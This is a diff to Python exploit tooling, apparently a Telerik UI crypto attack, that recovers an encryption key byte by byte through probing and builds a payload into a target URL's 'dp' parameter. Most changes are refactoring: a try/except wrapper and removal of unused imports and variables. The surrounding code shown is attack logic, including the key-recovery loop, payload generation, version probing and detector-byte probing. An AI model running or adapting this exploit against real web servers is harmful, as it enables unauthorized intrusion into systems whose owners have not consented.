@@ -8,8 +8,6 @@ from lib.constants import *
 import sys
 import re
 
-import time
-
 def byte_xor(ba1, ba2):
     return bytes([b1 ^ b2 for b1, b2 in zip(ba1, ba2)])
 
@@ -78,26 +76,26 @@ class CryptOMG():
 
         
     def findKey(self):
-   #     try:
-        if not self.finalkey:
-            while 1:
-                self.solveBlock()
-                if len(b''.join(self.solved_blocks)) == self.length:
-                    break
-             #   self.msgPrint("Current Key Progress: [" + b''.join(self.solved_blocks).hex() + "]",style="success")
-            
-            finalkey = b''.join(self.solved_blocks)
-            self.finalkey = finalkey
-            self.msgPrint("Found final key! [" + finalkey.hex() + "]",style="success")
-            self.findKeyComplete = True
-           # return finalkey
+        try:
+            if not self.finalkey:
+                while 1:
+                    self.solveBlock()
+                    if len(b''.join(self.solved_blocks)) == self.length:
+                        break
+                 #   self.msgPrint("Current Key Progress: [" + b''.join(self.solved_blocks).hex() + "]",style="success")
+                
+                finalkey = b''.join(self.solved_blocks)
+                self.finalkey = finalkey
+                self.msgPrint("Found final key! [" + finalkey.hex() + "]",style="success")
+                self.findKeyComplete = True
+               # return finalkey
 
-        else:
-            self.msgPrint("Starting with known key, skipping to payload generation")
+            else:
+                self.msgPrint("Starting with known key, skipping to payload generation")
 
-        self.generate_payload()
-       # except Exception as e:
-       #     self.msgPrint(e,style="error")
+            self.generate_payload()
+        except Exception as e:
+            self.msgPrint(e,style="error")
 
     
     def generate_payload(self):
@@ -132,8 +130,7 @@ class CryptOMG():
             ciphertextB64 = base64.b64encode(ciphertext).decode()
             full_url = f"{self.url}{telerik_params}&dp={ciphertextB64}"
 
-            actual_version = None
-            validated_version = False
+         
             r = self.versionProbe(full_url,version)
 
             if r.status_code == 200 and b'Error' not in r.content:
@@ -313,8 +310,6 @@ class Block():
         self.parent.msgPrint("Attempting to discover detector byte baseline")
         test_chars = [b'\x00',b'\x6b',b'\x08']
         
-
-        from itertools import permutations
         for i in itertools.product(test_chars, repeat=4):
 
             if self.sendProbe(b"".join(i)):
